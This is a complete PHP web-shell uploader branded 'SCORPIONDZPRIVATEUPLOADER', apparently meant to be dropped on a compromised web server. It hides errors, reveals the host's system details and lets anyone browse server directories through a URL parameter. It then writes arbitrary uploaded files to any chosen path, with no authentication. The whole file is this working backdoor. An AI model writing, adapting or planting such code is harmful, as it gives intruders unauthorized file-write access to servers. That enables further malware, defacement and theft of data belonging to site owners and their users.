<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<title>SCORPIONDZPRIVATEUPLOADER</title>
<style>
body{
background-color:black;
font-family:Kelly Slab;
color:white;
}
a{
color:white;
font-size: 19px;
text-decoration:none;
}
.page{
position: absolute;
    		margin: auto;
    		height: 50%;
    		top: 0; bottom: 0; left: 0; right:0;
     	}
    </style>';
if(isset($_GET['up'])) {
echo '<center>
<div class="page">
<img src="https://i.ibb.co/T1BLypN/Black-Blue-Scorpion-Wallpaper-520x416.jpg" height="300px">
<h3>'.php_uname().'</h3><br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?up&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?up&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white"><br><b>Upload  : </font><input type="file" name="file" style="font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid red;"/>
<input type="submit" value="Upload" style="margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid red;border-radius:5px"/><br><br>
</form></center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<script>alert("UPLOADED SUCCES !!!!!")</script><br/>';
}else{
echo '<script> alert("UPLOADED FAILED !!!!!")</script><br/>';
}
}
}
?>
